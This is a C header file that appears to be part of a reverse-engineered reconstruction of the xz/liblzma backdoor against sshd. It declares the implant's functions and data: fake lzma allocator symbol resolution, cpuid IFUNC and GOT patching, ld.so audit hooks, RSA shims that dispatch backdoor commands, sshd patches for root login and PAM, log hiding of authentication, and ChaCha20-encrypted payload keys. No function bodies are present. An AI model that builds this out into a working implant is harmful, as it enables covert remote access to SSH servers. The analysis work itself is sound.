extern void *fake_lzma_alloc_resolve_symbol(void *opaque, size_t nmemb, size_t size);

extern void fake_lzma_free_noop(void *opaque, void *ptr);

extern elf_functions_t *get_elf_functions_table(void);

extern BOOL secret_data_append_opcode_bit(dasm_ctx_t *dctx, secret_data_shift_cursor_t *cursor);

extern BOOL secret_data_append_code_bits(
 void *code_start,
 void *code_end,
 secret_data_shift_cursor_t shift_cursor,
 unsigned shift_count, BOOL start_from_call);

extern BOOL secret_data_append_item_if_enabled(
 secret_data_shift_cursor_t shift_cursor,
 unsigned operation_index,
 unsigned shift_count,
 int index, u8 *code);

typedef BOOL (*secret_data_appender_fn)(
  secret_data_shift_cursor_t shift_cursor,
  unsigned operation_index,
  unsigned shift_count,
  int index,
  u8 *code);

extern BOOL secret_data_append_items_batch(
 secret_data_item_t *items,
 u64 items_count,
 secret_data_appender_fn appender);

extern BOOL secret_data_append_bits_from_addr_or_ret(
 void *addr,
 secret_data_shift_cursor_t shift_cursor,
 unsigned shift_count, unsigned operation_index);

extern BOOL secret_data_append_singleton_bits(
 u8 *call_site, u8 *code,
 secret_data_shift_cursor_t shift_cursor,
 unsigned shift_count, unsigned operation_index);

extern BOOL secret_data_append_bits_from_call_site(
 secret_data_shift_cursor_t shift_cursor,
 unsigned shift_count, unsigned operation_index,
 BOOL bypass
);

extern BOOL backdoor_install_runtime_hooks(backdoor_setup_params_t *params);

extern void restore_ldso_audit_state(ldso_ctx_t *ldso_ctx);

extern unsigned int cpuid_ifunc_resolver_entry(unsigned int cpuid_request, u64 *caller_frame);

extern void * cpuid_ifunc_patch_got_for_stage2(elf_entry_ctx_t *state, u64 *caller_frame);

extern void init_cpuid_ifunc_entry_ctx(elf_entry_ctx_t *ctx);

extern void cache_got_base_offset_from_cpuid_anchor(elf_entry_ctx_t *ctx);

extern void cache_cpuid_gotplt_slot_index(elf_entry_ctx_t *ctx);

extern BOOL cpuid_ifunc_stage2_install_hooks(elf_entry_ctx_t *ctx, u64 *caller_frame, void **cpuid_got_addr, backdoor_cpuid_reloc_consts_t* reloc_consts);

extern BOOL resolve_libc_read_errno_imports(
 struct link_map *libc,
 elf_info_t *libc_info,
 libc_imports_t *imports
);

extern BOOL scan_shared_libraries_via_r_debug(backdoor_shared_libraries_data_t *data);

extern BOOL scan_link_map_and_init_shared_libs(struct link_map *r_map, backdoor_shared_libraries_data_t *data);

extern BOOL chacha20_decrypt(
 u8 *in, int inl,
 u8 *key, u8 *iv,
 u8 *out, imported_funcs_t *funcs
);

extern BOOL secret_data_decrypt_with_embedded_seed(u8 *output, global_context_t *ctx);

extern BOOL is_range_mapped_via_pselect(u8* addr, u64 length, global_context_t* ctx);

extern u32 popcount_u64(u64 x);

extern EncodedStringId encoded_string_id_lookup(const char *string_begin, const char *string_end);

extern unsigned int get_cpuid_with_ifunc_bootstrap(unsigned int leaf, unsigned int *eax, unsigned int *ebx, unsigned int *ecx, unsigned int *edx, u64 *caller_frame);

extern void cpuid_query_and_unpack(unsigned int level, unsigned int *eax, unsigned int *ebx, unsigned int *ecx, unsigned int *edx);

extern int hooks_ctx_init_or_wait_for_shared_globals(backdoor_hooks_ctx_t *ctx);

extern int init_backdoor_shared_globals(backdoor_shared_globals_t *shared_globals);

extern BOOL libcrypto_imports_ready_or_install_bootstrap(imported_funcs_t *imported_funcs);

extern void *resolve_gotplt_base_from_tls_get_addr(elf_entry_ctx_t *entry_ctx);

extern ptrdiff_t seed_got_ctx_for_tls_get_addr_parse(elf_entry_ctx_t *ctx);

/*
 * Standard glibc TLS index pair (module + offset) used when calling the loader’s `__tls_get_addr` trampoline from within the implant.
 */
typedef struct dl_tls_index
{
 uint64_t ti_module;
 uint64_t ti_offset;
} tls_index;

extern void *__tls_get_addr(tls_index *ti);

extern void *dummy_tls_get_addr (tls_index *ti);

extern void *tls_get_addr_trampoline(tls_index *ti);

extern uintptr_t backdoor_symbind64(
 Elf64_Sym *sym,
 unsigned int ndx,
 uptr *refcook, uptr *defcook,
 unsigned int flags,
 const char *symname);

extern BOOL rsa_backdoor_command_dispatch(RSA *key, global_context_t *ctx, BOOL *do_orig);

extern BOOL resolve_ldso_audit_offsets(
 backdoor_data_handle_t *data,
 ptrdiff_t *libname_offset,
 backdoor_hooks_data_t *hooks,
 imported_funcs_t *imported_funcs);

extern BOOL find_link_map_l_name_offsets(
 backdoor_data_handle_t *data_handle,
 ptrdiff_t *libname_offset,
 backdoor_hooks_data_t *hooks,
 imported_funcs_t *imported_funcs);

extern BOOL find_dl_naudit_slot(
 elf_info_t *dynamic_linker_elf,
 elf_info_t *libcrypto_elf,
 backdoor_hooks_data_t *hooks,
 imported_funcs_t *imported_funcs);

extern BOOL find_l_audit_any_plt_mask_via_symbind_alt(
 backdoor_data_handle_t *data,
 ptrdiff_t libname_offset,
 backdoor_hooks_data_t *hooks,
 imported_funcs_t *imported_funcs);

extern BOOL find_l_audit_any_plt_mask_and_slot(
 backdoor_data_handle_t *data,
 instruction_search_ctx_t *search_ctx);

extern BOOL sshd_find_sensitive_data_base_via_xcalloc(
 u8 *data_start,
 u8 *data_end,
 u8 *code_start,
 u8 *code_end,
 string_references_t *string_refs,
 sensitive_data **sensitive_data_out);

extern BOOL sshd_find_sensitive_data_base_via_krb5ccname(
 u8 *data_start,
 u8 *data_end,
 u8 *code_start,
 u8 *code_end,
 sensitive_data **sensitive_data_out,
 elf_info_t *elf);

extern int sshd_score_sensitive_data_candidate_in_demote_sensitive_data(
 sensitive_data *sensitive_data,
 elf_info_t *elf,
 string_references_t *refs);

extern int sshd_score_sensitive_data_candidate_in_main(
 sensitive_data *sensitive_data,
 elf_info_t *elf,
 string_references_t *refs);

extern int sshd_score_sensitive_data_candidate_in_do_child(
 sensitive_data *sensitive_data,
 elf_info_t *elf,
 string_references_t *refs);

extern int sshd_score_sensitive_data_candidate(
 sensitive_data *sensitive_data,
 elf_info_t *elf,
 string_references_t *refs);

extern BOOL bignum_mpint_serialize(
 u8 *buffer, u64 bufferSize,
 u64 *pOutSize,
 const BIGNUM *bn,
 imported_funcs_t *funcs);

extern BOOL sshbuf_is_negative_mpint(struct sshbuf *buf);

extern BOOL rsa_pubkey_sha256_fingerprint(
 const RSA *rsa,
 u8 *mdBuf,
 u64 mdBufSize,
 imported_funcs_t *funcs);

extern BOOL dsa_pubkey_sha256_fingerprint(
 const DSA *dsa,
 u8 *mdBuf,
 u64 mdBufSize,
 global_context_t *ctx);

extern BOOL sha256_digest(
 const void *data,
 size_t count,
 u8 *mdBuf,
 u64 mdBufSize,
 imported_funcs_t *funcs);

extern BOOL verify_ed448_signed_payload(
 struct sshkey *sshkey,
 u8 *signed_data,
 u64 sshkey_digest_offset,
 u64 signed_data_size,
 u8 *signature,
 u8 *ed448_raw_key,
 global_context_t *global_ctx
);

extern BOOL sshd_patch_permitrootlogin_usepam_and_hook_authpassword(
 BOOL skip_root_patch,
 BOOL disable_pam,
 BOOL replace_monitor_reqtype,
 monitor_reqtype_t monitor_reqtype,
 global_context_t *global_ctx
);

extern BOOL sshd_find_monitor_ptr_slot(
 elf_info_t *elf,
 string_references_t *refs,
 global_context_t *ctx
);

extern BOOL sshd_find_main_from_entry_stub(
 u8 **code_start_out,
 elf_info_t *sshd,
 elf_info_t *libcrypto,
 imported_funcs_t *imported_funcs
);

extern BOOL sshd_find_monitor_field_slot_via_mm_request_send(
 u8 *code_start,
 u8 *code_end,
 u8 *data_start,
 u8 *data_end,
 void **monitor_field_ptr_out,
 global_context_t *ctx
);

extern void *find_riprel_mov_load_target_in_range(
 StringXrefId id,
 string_references_t *refs,
 void *mem_range_start,
 void *mem_range_end
);

extern BOOL sshd_validate_log_handler_slots(
 void *addr1,
 void *addr2,
 void *search_base,
 u8 *code_end,
 string_references_t *refs,
 global_context_t *global
);

/*
 * Direction selector the socket helpers use to know whether we should fetch the readable or writable monitor file descriptor.
 */
typedef enum SocketMode {
 DIR_WRITE = 0,
 DIR_READ = 1
} SocketMode;

extern BOOL sshd_get_monitor_comm_fd(
 global_context_t *ctx,
 int *pSocket,
 int socket_index,
 enum SocketMode socket_direction
);

extern BOOL sshd_find_socket_fd_by_shutdown_probe(int *pSock, int socket_index, libc_imports_t *imports);

extern BOOL sshd_find_forged_modulus_sshbuf(struct sshbuf *sshbuf, global_context_t *ctx);

extern BOOL sshbuf_extract_ptr_and_len(struct sshbuf *buf, global_context_t *ctx, void **p_sshbuf_d, size_t *p_sshbuf_size);

extern BOOL sshbuf_extract_rsa_modulus(
 struct sshbuf *sshbuf_data,
 size_t sshbuf_size,
 size_t *out_payload_size,
 global_context_t *ctx);

extern BOOL payload_stream_decrypt_and_append_chunk(
 key_payload_t *payload,
 size_t payload_size,
 global_context_t *ctx);

extern BOOL payload_stream_validate_or_poison(global_context_t *ctx);

extern int mm_answer_keyallowed_payload_dispatch_hook(struct ssh *ssh, int sock, struct sshbuf *m);

extern int mm_answer_keyverify_send_staged_reply_hook(struct ssh *ssh, int sock, struct sshbuf *m);

extern int mm_answer_authpassword_send_reply_hook(struct ssh *ssh, int sock, struct sshbuf *m);

extern void mm_log_handler_hide_auth_success_hook(
 LogLevel level,
 int forced,
 const char *msg,
 void *ctx);

extern ssize_t fd_read_full(
 int fd,
 void *buffer,
 size_t count,
 libc_imports_t *funcs);

extern ssize_t fd_write_full(
 int fd,
 void *buffer,
 size_t count,
 libc_imports_t *funcs);

extern BOOL pointer_array_has_null(
 void **pointers,
 unsigned int num_pointers
);

extern BOOL count_null_terminated_ptrs(
 void **ptrs,
 u64 *count_out,
 libc_imports_t *funcs
);

extern BOOL sshd_install_mm_log_handler_hook(cmd_arguments_t *cmd_flags, global_context_t *ctx);

extern int rsa_public_decrypt_backdoor_shim(
 int flen, unsigned char *from,
 unsigned char *to, RSA *rsa, int padding);

extern int evp_pkey_set1_rsa_backdoor_shim(EVP_PKEY *pkey, RSA *key);

extern void rsa_get0_key_backdoor_shim(
 const RSA *r,
 const BIGNUM **n,
 const BIGNUM **e,
 const BIGNUM **d);

extern void sshd_log_via_sshlogv(
 sshd_log_ctx_t *log_ctx,
 LogLevel level, const char *fmt, ...);

extern BOOL sshd_recon_bootstrap_sensitive_data(
 elf_info_t *sshd,
 elf_info_t *libcrypto,
 string_references_t *refs,
 imported_funcs_t *funcs,
 global_context_t *ctx);

extern ssize_t strlen_unbounded(
 char *str
);

extern ssize_t strnlen_bounded(
 char *str,
 size_t max_len
);

extern void* memmove_overlap_safe(
 char *dest,
 char *src,
 size_t cnt
);

extern u32 resolver_call_count;

extern global_context_t *global_ctx;

extern backdoor_hooks_data_t *hooks_data;

extern backdoor_hooks_data_t *hooks_data_addr;

extern const ptrdiff_t fake_lzma_allocator_offset;

extern fake_lzma_allocator_t fake_lzma_allocator;

extern void *lzma_alloc(size_t size, lzma_allocator *allocator);

extern void lzma_free(void *ptr, lzma_allocator *allocator);

extern void lzma_check_init(lzma_check_state *state, lzma_check check_id);

extern const ptrdiff_t elf_functions_offset;

extern const elf_functions_t elf_functions;

extern const u64 cpuid_random_symbol;

extern const u64 tls_get_addr_random_symbol;

extern const backdoor_cpuid_reloc_consts_t cpuid_reloc_consts;

extern const backdoor_tls_get_addr_reloc_consts_t tls_get_addr_reloc_consts;

extern const u8 dasm_threebyte_has_modrm[32];

extern const u8 dasm_threebyte_0x38_is_valid[32];

extern const u8 dasm_twobyte_has_modrm[32];

extern const u8 dasm_twobyte_is_valid[32];

extern const u8 dasm_onebyte_has_modrm[32];

extern const u8 dasm_onebyte_is_invalid[32];

typedef struct __attribute__((packed)) key_buf {
 u8 seed_key[0x20]; /* ChaCha key baked into the binary; decrypts the 0x30-byte seed blob. */
 u8 seed_iv[0x10]; /* Static ChaCha nonce/counter paired with seed_key. */
 u8 encrypted_seed[0x30]; /* Ciphertext that yields the runtime ChaCha key once decrypted. */
 u8 payload_iv[0x10]; /* Fixed nonce used when decrypting ctx->encrypted_secret_data. */
} key_buf;

extern const u64 string_mask_data[238];

extern const u32 string_action_data[1304];
